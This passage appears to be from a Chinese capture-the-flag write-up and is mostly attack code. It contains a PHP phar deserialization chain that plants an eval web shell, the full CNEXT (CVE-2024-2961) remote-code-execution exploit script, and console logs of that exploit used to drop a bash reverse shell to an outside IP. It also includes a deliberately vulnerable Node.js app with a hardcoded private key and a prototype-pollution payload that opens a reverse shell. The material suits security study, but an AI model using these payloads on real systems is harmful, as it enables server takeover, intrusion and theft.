            $this->url = '<?php file_put_contents("/var/www/public/uploads/store/comment/20240929/fpclose.php", '<?php eval($_POST[1]); ?>', FILE_APPEND); ?>';
        }
    }
    class App{
        protected $instances = [];
        public function __construct(){
            $this->instances = ['thinkRequest'=>new Request()];
        }
    }
}

namespace thinkviewdriver{
    class Php{}
}

namespace thinklogdriver{
    class Socket{
        protected $config = [];
        protected $app;
        public function __construct(){

            $this->config = [
                'debug'=>true,
                'force_client_ids' => 1,
                'allow_client_ids' => '',
                'format_head' => [new thinkviewdriverPhp,'display'],
            ];
            $this->app = new thinkApp();
        }
    }
}

namespace {
    $c = new thinklogdriverSocket();
    $b = new thinklogChannel($c);
    $a = new PhpOfficePhpSpreadsheetCollectionCells($b);

    ini_set("phar.readonly", 0);
    $phar = new Phar('1.phar');
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($a);
    $phar->addFromString("fpclose.jpg", "666");
    $phar->stopBuffering();

}
gzip 1.jpg
{"status":
200,"msg":"图片上传成功","data":{"name":"749e04b0905aa5bf0a364f86a70f7d74.jpg.jpg","url":"http://1.95.73.253/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg"},"code":"100009"}
/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg
<?php
    @mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

class Remote:
    """A helper class to send the payload and download files.
  
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
  
    The code here serves as an example that attacks a page that looks like:
  
    ```php
    <?php
  
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
  
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        return self.session.post(self.url, data={"file": path})
      
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep_time", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
      
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            
except ConnectionError:
                failure("Target not [b]reachable[/] ?")
          

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:
text/plain;base64,{base64}"
      
        result = safe_download(path)
      
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:
text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:
text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)b" r".*" r"s([-rwx]{3}[ps])s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:
zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0n".ljust(step2_size, b"x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:
text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
          
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
          
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
          
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
          
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
          
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        
except (ConnectionError, ChunkedEncodingError):
            pass
      
        msg_print()
      
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
      
        msg_print()

def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]

def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()

def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)

def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:
02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket

def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004nABCDn`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"nn")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"n" + data + b"n"

@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start

Exploit()
 root@webn1ght:~/poc/php-filter-iconv-main
# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'echo "/bin/bash -c "bash -i >& /dev/tcp/112.124.59.213/8888 0>&1"" > /tmp/night'
[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7f1ce1e00040 as heap
[!] Could not populate PLT: Invalid argument (UC_ERR_ARG)

     EXPLOIT  SUCCESS 

root@webn1ght:~/poc/php-filter-iconv-main
# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'chmod +x /tmp/night'
[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7f1ce1e00040 as heap
[!] Could not populate PLT: Invalid argument (UC_ERR_ARG)

     EXPLOIT  SUCCESS 

root@webn1ght:~/poc/php-filter-iconv-main
# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'bash /tmp/night'
[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7f1ce1e00040 as heap
[!] Could not populate PLT: Invalid argument (UC_ERR_ARG)
const express = require('express');
const fs = require('fs');
var nodeRsa = require('node-rsa');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(16).toString('hex');
const path = require('path');
const zlib = require('zlib');
const mysql = require('mysql')
const handle = require('./handle');
const cp = require('child_process');
const cookieParser = require('cookie-parser');

const con = mysql.createConnection({
  host: 'localhost',
  user: 'ctf',
  password: 'ctf123123',
  port: '3306',
  database: 'sctf'
})
con.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL:', err.message);
    setTimeout(con.connect(), 2000); // 2秒后重试连接
  } else {
    console.log('Connected to MySQL');
  }
});

const {response} = require("express");
const req = require("express/lib/request");

var key = new nodeRsa({ b: 1024 });
key.setOptions({ encryptionScheme: 'pkcs1' });

var publicPem = -----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQnTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2ICnXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGenI+Atul1rSE0APhHoPwIDAQABn-----END PUBLIC KEY-----;
var privatePem = `-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27
PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l
i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi
6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI
lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY
Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61
khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT
6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78
dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG
mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye
KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh
UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l
zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg
xu/vfQ0A1jHRNC7t
-----END PRIVATE KEY-----`;

const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'static')));
app.use(cookieParser());

var Reportcache = {}

function verifyAdmin(req, res, next) {
  const token = req.cookies['auth_token'];

  if (!token) {
    return res.status(403).json({ message: 'No token provided' });
  }

  jwt.verify(token, SECRET_KEY, (err, decoded) => {
    if (err) {
      return res.status(403).json({ message: 'Failed to authenticate token' });
    }

    if (decoded.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied. Admins only.' });
    }

    req.user = decoded;
    next();
  });
}

app.get('/hello', verifyAdmin ,(req, res)=> {
  res.send('<h1>Welcome Admin!!!</h1>
');
});

app.get('/config', (req, res) => {
  res.json({
    publicKey: publicPem,
  });
});

var decrypt = function(body) {
  try {
    var pem = privatePem;
    var key = new nodeRsa(pem, {
      encryptionScheme: 'pkcs1',
      b: 1024
    });
    key.setOptions({ environment: "browser" });
    return key.decrypt(body, 'utf8');
  } catch (e) {
    console.error("decrypt error", e);
    return false;
  }
};

app.post('/login', (req, res) => {
  const encryptedPassword = req.body.password;
  const username = req.body.username;

  try {
    passwd = decrypt(encryptedPassword)
    if(username === 'admin') {
      const sql = select (select password from user where username = 'admin') = '${passwd}';
      con.query(sql, (err, rows) => {
        if (err) throw new Error(err.message);
        if (rows[0][Object.keys(rows[0])]) {
          const token = jwt.sign({username, role: username}, SECRET_KEY, {expiresIn: '1h'});
          res.cookie('auth_token', token, {secure: false});
          res.status(200).json({success: true, message: 'Login Successfully'});
        } else {
          res.status(200).json({success: false, message: 'Errow Password!'});
        }
      });
    } else {
      res.status(403).json({success: false, message: 'This Website Only Open for admin'});
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error decrypting password!' });
  }
});

app.get('/ExP0rtApi', verifyAdmin, (req, res) => {
  var rootpath = req.query.v;
  var file = req.query.f;

  file = file.replace(/..//g, '');
  rootpath = rootpath.replace(/..//g, '');

  if(rootpath === ''){
    if(file === ''){
      return res.status(500).send('try to find parameters HaHa');
    } else {
      rootpath = "static"
    }
  }

  const filePath = path.join(__dirname, rootpath + "/" + file);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  fs.readFile(filePath, (err, fileData) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).send('Error reading file');
    }

    zlib.gzip(fileData, (err, compressedData) => {
      if (err) {
        console.error('Error compressing file:', err);
        return res.status(500).send('Error compressing file');
      }
      const base64Data = compressedData.toString('base64');
      res.send(base64Data);
    });
  });
});

app.get("/report", verifyAdmin ,(req, res) => {
  res.sendFile(__dirname + "/static/report_noway_dirsearch.html");
});

app.post("/report", verifyAdmin ,(req, res) => {
  const {user, date, reportmessage} = req.body;
  if(Reportcache[user] === undefined) {
    Reportcache[user] = {};
  }
  Reportcache[user][date] = reportmessage
  res.status(200).send("<script>alert('Report Success');window.location.href='/report'</script>");
});

app.get('/countreport', (req, res) => {
  let count = 0;
  for (const user in Reportcache) {
    count += Object.keys(Reportcache[user]).length;
  }
  res.json({ count });
});

//查看当前运行用户
app.get("/VanZY_s_T3st", (req, res) => {
  var command = 'whoami';
  const cmd = cp.spawn(command ,[]);
  cmd.stdout.on('data', (data) => {
    res.status(200).end(data.toString());
  });
})

app.listen(3000, () => {
  console.log('Server running on http://localhost:
3000');
});
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class Test {
    public static void main(String[] args) throws Exception {
        String str = "H4sIAAAAAAAAA/PLVwhKTrX3VEhOzFMvUXDPLEtViMwvVXDLSUxXcCrK5wIAJvPeCSEAAAA=";
        byte[] decode = Base64.getDecoder().decode(str);
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(decode));
        byte[] buffer = new byte[256];
        int n;
        while ((n = gzipInputStream.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        System.out.println(new String(out.toByteArray()));
    }
}
{
  "dependencies": {
    "body-parser": "^1.20.3",
    "cookie-parser": "^1.4.6",
    "crypto": "^1.0.1",
    "express": "^4.21.0",
    "jsonwebtoken": "^9.0.2",
    "mysql": "^2.18.1",
    "node-rsa": "^1.1.1",
    "path": "^0.12.7",
    "require-in-the-middle": "^7.4.0"
  }
}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Report Submission</title>

    
</head>

<h1>Submit a Report</h1>


    
        Current number of reports: Loading...
    

    <form action="/report" method="POST">
        
            <label for="user">User:</label>
            
        

        

        
            <label for="reportmessage">Report Message:</label>
            <textarea id="reportmessage" name="reportmessage" rows="6" required></textarea>
        

        Submit Report
    </form>


<script>
    window.onload = function() {
        // 获取当前日期并填入隐藏字段
        const today = new Date();
        const year = today.getFullYear();
        const month = String(today.getMonth() + 1).padStart(2, '0');
        const day = String(today.getDate()).padStart(2, '0');
        const formattedDate = `${year}${month}${day}`;
        document.getElementById('date').value = formattedDate;

        // 请求当前报告数量并更新显示
        fetch('/countreport')
            .then(response => response.json())
            .then(data => {
                document.getElementById('report-count').textContent = data.count;
            })
            .catch(error => {
                console.error('Error fetching report count:', error);
                document.getElementById('report-count').textContent = 'Error';
            });
    };
</script>

</html>
{
"user":"__proto__",
"date":2,
"reportmessage": 
    {
    "shell":"/readflag",
    "env": 
        {
            "NODE_DEBUG": "require("child_process").exec("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");process.exit()//",
        "NODE_OPTIONS": "--require /proc/self/environ"

        }
    }
}
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>像素图渲染</title>
    
</head>

    
        
    

</html>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1729752297.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729752298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/6-1729752298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/5-1729752298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/2-1729752299.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1729752299.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/1-1729752299.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729752300.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/1-1729752300.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1729752300.png)